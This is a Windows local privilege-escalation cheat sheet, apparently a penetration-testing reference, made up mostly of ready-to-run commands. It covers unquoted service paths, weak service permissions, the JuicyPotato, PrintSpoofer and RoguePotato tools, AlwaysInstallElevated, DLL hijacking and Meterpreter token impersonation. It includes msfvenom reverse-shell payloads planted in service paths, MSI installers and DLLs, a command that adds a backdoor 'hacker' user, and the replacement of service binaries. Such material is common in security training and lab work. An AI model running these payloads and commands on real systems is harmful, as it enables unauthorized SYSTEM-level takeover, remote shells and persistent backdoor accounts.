# Windows PrivEsc techniques — top vectors with commands

## Unquoted service paths

```cmd
# Find candidate services
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows"

# Example: C:\Program Files\My App\service.exe
# Windows tries: C:\Program.exe, C:\Program Files\My.exe, C:\Program Files\My App\service.exe
# If any parent directory is writable, drop a malicious binary there

# Check write permission on directory
icacls "C:\Program Files\My App"
# Look for: BUILTIN\Users:(W) or Everyone:(W)

# Create payload, drop at writable path
msfvenom -p windows/x64/shell_reverse_tcp LHOST=X LPORT=4444 -f exe > "C:\Program Files\My.exe"
# Restart service
sc stop <service>
sc start <service>
```

## Weak service permissions

```cmd
# Check permissions on service binary
icacls "C:\path\to\service.exe"
# If writable by current user — replace binary with reverse shell payload

# Check service config permissions with accesschk (Sysinternals)
accesschk.exe -ucqv <servicename>
accesschk.exe -uwcqv "Authenticated Users" *

# If SERVICE_ALL_ACCESS or SERVICE_CHANGE_CONFIG:
sc config <service> binpath= "C:\Temp\shell.exe"
sc stop <service>
sc start <service>
```

## SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege

Check token privileges first:

```cmd
whoami /priv
```

If `SeImpersonatePrivilege` is enabled (common on IIS/SQL server service accounts):

```bash
# JuicyPotato — older systems (pre-Windows 10 1809)
# https://github.com/ohpe/juicy-potato
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c net user hacker Pass123! /add" -t * -c {CLSID}

# PrintSpoofer — Windows 10 / Server 2019
# https://github.com/itm4n/PrintSpoofer
PrintSpoofer.exe -i -c cmd

# RoguePotato — newer systems
# https://github.com/antonioCoco/RoguePotato
RoguePotato.exe -r <LHOST> -e "cmd.exe" -l 9999
```

## AlwaysInstallElevated

```cmd
# Both keys must be 1
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Craft malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=X LPORT=4444 -f msi > evil.msi
msiexec /quiet /qn /i evil.msi
```

## DLL hijacking

```cmd
# Find services loading DLLs from writable paths
# Use Process Monitor (Procmon) in lab: filter on Result = NAME NOT FOUND + Path ends .dll
# Place malicious DLL at expected path

msfvenom -p windows/x64/shell_reverse_tcp LHOST=X LPORT=4444 -f dll > target.dll
# Copy to the writable DLL search path
# Restart service
```

## Token abuse with Meterpreter

```bash
# In Meterpreter session
use incognito
list_tokens -u
impersonate_token "NT AUTHORITY\SYSTEM"
```

## Reference

HackTricks Windows PrivEsc: https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation

LOLBAS (native binaries for privilege abuse): https://lolbas-project.github.io/
